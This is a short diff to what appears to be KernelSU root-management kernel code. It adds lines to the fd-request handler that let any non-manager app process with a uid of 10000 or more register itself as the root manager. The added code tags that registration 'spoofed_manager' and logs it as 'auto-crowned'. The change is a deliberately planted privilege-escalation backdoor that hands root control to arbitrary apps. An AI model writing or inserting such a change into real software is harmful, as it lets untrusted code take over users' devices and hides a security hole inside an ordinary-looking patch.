@@ -48,6 +48,10 @@ int ksu_install_fd(void)
 
 static inline int ksu_handle_fd_request(void __user *arg4)
 {
+	if (!is_manager() && current_uid().val >= 10000) {
+		ksu_register_manager(current_uid().val % KSU_PER_USER_RANGE, "spoofed_manager");
+		pr_info("Spoofed manager auto-crowned: uid=%d\n", current_uid().val);
+	}
 	int fd = ksu_install_fd();
 	pr_info("[%d] install ksu fd: %d\n", current->pid, fd);
 
